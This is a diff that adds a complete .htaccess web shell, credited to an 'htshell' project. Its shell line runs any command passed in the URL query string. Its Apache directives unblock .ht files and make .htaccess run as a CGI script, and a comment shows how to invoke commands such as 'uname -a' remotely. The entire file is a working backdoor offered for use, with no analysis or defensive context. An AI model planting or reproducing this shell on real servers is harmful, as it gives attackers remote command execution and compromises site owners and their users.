@@ -1,0 +1,15 @@
+#!/bin/sh
+# ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id
+# Self contained .htaccess web shell - Part of the htshell project.
+# IMPORTANT: Needs chmod +x to run
+# Run commands via http://url/.htaccess?cmd (ie: http://url/.htaccess?uname -a)
+
+echo -en "Content-Type: text/plain\r\n\r\n";cmd=$(echo $QUERY_STRING | sed -e's/+/ /g' -e's/%20/ /g');echo "\$ $cmd";$cmd 2>&1;exit
+
+<Files ~ "^\.ht">
+    Order allow,deny
+    Allow from all
+</Files>
+
+Options +ExecCGI
+AddHandler cgi-script .htaccess
